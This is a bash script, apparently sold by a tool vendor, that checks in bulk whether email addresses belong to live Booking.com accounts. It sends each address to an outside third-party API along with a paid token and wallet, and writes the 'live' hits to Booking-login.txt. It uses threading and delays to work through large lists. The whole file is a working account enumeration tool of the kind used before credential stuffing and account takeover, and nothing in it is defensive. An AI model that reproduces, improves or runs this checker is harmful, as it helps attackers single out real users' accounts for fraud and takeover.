#!/usr/bin/env bash
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
WHITE='\033[0;37m'
KUNING='\033[0;33m'
GONGON='\033[41m'
GINGIN='\033[104m'
GUNGUN='\033[42m'


#! configuration
YOURWALLET='inserthere' #! Insert your wallet here
YOURTOKEN='inserthere' #! Insert your token here
#! End configuration

header(){


cat <<EOF
_________ _______  _______  _        _______  ______   _______              _______  _______  _______ 
\__   __/(  ___  )(  ___  )( \      (  ____ \(  ___ \ (  __   )|\     /|   (  ____ \(  ___  )(       )
   ) (   | (   ) || (   ) || (      | (    \/| (   ) )| (  )  |( \   / )   | (    \/| (   ) || () () |
   | |   | |   | || |   | || |      | (_____ | (__/ / | | /   | \ (_) /    | |      | |   | || || || |
   | |   | |   | || |   | || |      (_____  )|  __ (  | (/ /) |  ) _ (     | |      | |   | || |(_)| |
   | |   | |   | || |   | || |            ) || (  \ \ |   / | | / ( ) \    | |      | |   | || |   | |
   | |   | (___) || (___) || (____/\/\____) || )___) )|  (__) |( /   \ ) _ | (____/\| (___) || )   ( |
   )_(   (_______)(_______)(_______/\_______)|/ \___/ (_______)|/     \|(_)(_______/(_______)|/     \|
   
EOF
echo -e "=========================[ ${GINGIN}BOOKING.COM ACCOUNT CHECKER${WHITE} ]========================="

echo -e "${GREEN}BOOKING ACCOUNT CHECKER by Toolsb0x.com${WHITE}"
echo -e "${GREEN}Don't Forget To Re-Download Every Month For Update API${WHITE}"
echo -e "${GREEN}Don't share your token to anyone ! ${WHITE}"


}
check(){
    cr=$(curl -s 'http://api.toolsb0x.com/api/booking-checker.php?list='$email'&token='$YOURTOKEN'&wallet='$YOURWALLET'')
     if [[ $cr =~ '"status":"live"' ]]; then
        echo -e "[$2/$total] ${GREEN}BOOKING.COM LIVE => $email${WHITE} [ Toolsb0x.com - [$date]]"
        echo $email "[ Toolsb0x.com - [$date]]" >> Booking-login.txt
    elif [[ $cr =~ '"status":"die"' ]]; then
        echo -e "[$2/$total] ${RED}BOOKING.COM DIE => $email${WHITE}"
        echo $email >> Booking-failed.txt
	elif [[ $cr =~ '"status":"connection"' ]]; then
        echo -e "[$2/$total] ${KUNING}CONNECTIONFAILURE => $email${WHITE}"
        echo $email >> Booking-connectionfailure.txt
    else [[ $cr =~ '"status":"insufficient"' ]]; 
        echo -e "[$2/$total] ${GONGON}insufision balance => $email${WHITE}"
        echo $email >> Booking-insufisionbalance.txt
    fi
}

header
 
read -p "List: " l
if [[ ! -f $l ]]; then
    echo "[-] File $l Not Exist"
    exit 1
fi
 
read -p "Threads: " t
 
read -p "Delay: " d
 
echo
echo -e "[!] Mail Loaded    : ${BLUE}$(cat $l | wc -l)${WHITE}"
echo -e "[!] Threads Use 1  : ${BLUE}$t${WHITE}"
echo -e "[!] Delay Use 1    : ${BLUE}$d sec${WHITE}"
echo
echo -e "[+] Start Check ...\n"
 
pp=1
IFS=$'\r\n'
for email in $(cat $l); do
   tt=$(expr $pp % $t)
   if [[ $tt == 0 && $pp > 0 ]]; then
       sleep $d
   fi
   date=$(date '+%H:%M:%S')
   total=$(cat $l | wc -l)
   check $email $pp &
   pp=$[$pp+1]
done
wait
